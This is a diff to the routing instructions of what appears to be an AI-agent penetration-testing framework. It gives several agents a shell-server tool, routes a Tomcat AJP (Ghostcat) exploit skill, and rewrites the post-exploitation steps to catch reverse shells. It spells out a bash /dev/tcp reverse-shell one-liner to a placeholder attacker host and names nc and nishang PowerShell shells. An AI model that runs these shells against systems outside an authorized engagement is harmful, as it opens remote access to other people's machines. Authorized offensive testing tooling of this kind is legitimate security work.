@@ -124,10 +124,10 @@ every routing decision.
 
 | Agent | Domain | MCP Servers | Use For |
 |-------|--------|-------------|---------|
-| `network-recon-agent` | Network | skill-router, nmap-server | network-recon, smb-exploitation, pivoting-tunneling |
-| `web-agent` | Web | skill-router | All web discovery + technique skills |
-| `ad-agent` | Active Directory | skill-router | All AD discovery + technique skills |
-| `privesc-agent` | Privilege Escalation | skill-router | Linux/Windows discovery + technique skills, container escapes |
+| `network-recon-agent` | Network | skill-router, nmap-server, shell-server | network-recon, smb-exploitation, pivoting-tunneling |
+| `web-agent` | Web | skill-router, shell-server | All web discovery + technique skills |
+| `ad-agent` | Active Directory | skill-router, shell-server | All AD discovery + technique skills |
+| `privesc-agent` | Privilege Escalation | skill-router, shell-server | Linux/Windows discovery + technique skills, container escapes |
 
 **How to delegate:**
 
@@ -177,6 +177,7 @@ Use this table to pick the right agent for each skill:
 | xss-reflected, xss-stored, xss-dom | web-agent | Web |
 | ssti-identification, ssti-jinja2, ssti-dotnet | web-agent | Web |
 | command-injection, python-code-injection | web-agent | Web |
+| ajp-ghostcat | web-agent | Web (Tomcat AJP exploitation) |
 | ssrf, lfi, file-upload, xxe | web-agent | Web |
 | deserialization-java, deserialization-dotnet, deserialization-php | web-agent | Web |
 | jwt-attacks, request-smuggling, nosql-injection, ldap-injection | web-agent | Web |
@@ -517,17 +518,20 @@ Common chains that produce shell access on a host:
 > When any chain above produces command execution on a host, follow this
 > sequence before doing anything else:
 >
-> **1. Stabilize access — get an interactive shell.**
+> **1. Stabilize access — get an interactive shell via shell-server.**
 > A webshell, blind RCE callback, or database command execution is NOT a stable
-> shell. Before routing to discovery, upgrade to an interactive reverse shell:
-> - Linux: `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`, python pty, or nc
-> - Windows: PowerShell reverse shell, nc.exe, or establish WinRM/SSH if creds
->   are available
+> shell. Before routing to discovery, catch a reverse shell using the MCP
+> shell-server:
+> 1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
+> 2. Send a reverse shell payload through the current access method:
+>    - Linux: `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`, python, or nc
+>    - Windows: PowerShell reverse shell, nc.exe, or `nishang/Invoke-PowerShellTcp.ps1`
+> 3. Call `list_sessions()` to verify the connection arrived
+> 4. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
 >
-> Discovery skills assume interactive shell access. Trying to enumerate privesc
-> vectors through a webshell (URL-encoded commands, one-shot execution) is
-> fragile, slow, and misses output that requires an interactive terminal. Get a
-> proper shell first.
+> If the target has no outbound connectivity, fall back to inline command
+> execution and note the limitation in state.md. If the subagent has
+> shell-server MCP access, it can call these tools directly.
 >
 > **2. Route to the appropriate discovery skill.**
 > Do NOT run `sudo -l`, `find -perm -4000`, `whoami /priv`, `net user`, or any
